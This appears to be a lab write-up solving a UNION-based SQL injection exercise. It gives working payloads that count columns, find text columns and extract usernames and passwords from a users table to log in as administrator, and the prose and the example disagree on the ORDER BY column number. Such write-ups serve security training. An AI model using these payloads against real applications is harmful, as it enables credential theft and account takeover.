## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/234058543-7b45e24b-1e6a-4a3e-b65e-03687d4c983b.png)

## Solution :

> The database contains a different table called **users**, with columns called username and password.

#### Determine number of columns

**ORDER BY 3** shows an error , it means the web application retreives 2 columns in the query

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
```

![image](https://user-images.githubusercontent.com/67383098/234059573-93d0b8a0-ff4b-4e97-b31f-1403e5f81e2c.png)

#### Determine which column contains text data

*1st columns returns text data*

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'A',NULL --
```

![image](https://user-images.githubusercontent.com/67383098/234060309-9038d2e6-2d7d-47c4-a380-36eadbeec012.png)

*2nd column also retreives text data*

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'A' --
```

![image](https://user-images.githubusercontent.com/67383098/234060453-c86da807-fc07-45d0-bc78-e290bebecaba.png)

Since both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username,password FROM users --
```
![image](https://user-images.githubusercontent.com/67383098/234061618-7df6319c-199d-48f5-bf98-234684bff6e6.png)

![image](https://user-images.githubusercontent.com/67383098/234061661-b0778724-17d3-4786-b67a-ad53930b2a46.png)

![image](https://user-images.githubusercontent.com/67383098/234061490-8a148bb3-9d40-4051-b378-6fdf807161e0.png)

Thus we got all the usernames & password stored in the database.

Now we can login as administrator !

![image](https://user-images.githubusercontent.com/67383098/234062933-c91f5ab3-85aa-4593-b337-0b49f47d6cec.png)






